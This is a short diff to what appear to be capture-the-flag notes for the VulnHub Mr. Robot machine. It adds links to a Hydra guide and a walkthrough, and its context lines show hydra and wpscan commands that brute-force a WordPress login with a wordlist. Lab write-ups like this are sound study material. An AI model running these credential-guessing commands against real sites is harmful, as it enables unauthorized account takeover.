@@ -37,3 +37,8 @@ hydra -l elliot -P fsocity.dic 1$IP_ADDR http-post-form "/wp-login.php:log=^USER
 ```bash
 wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot  
 ```
+
+### Resource
+https://www.blackhillsinfosec.com/hacking-with-hydra/
+
+https://medium.com/@hackermentor/vulnhub-mr-robot-walkthrough-9309702b8e8
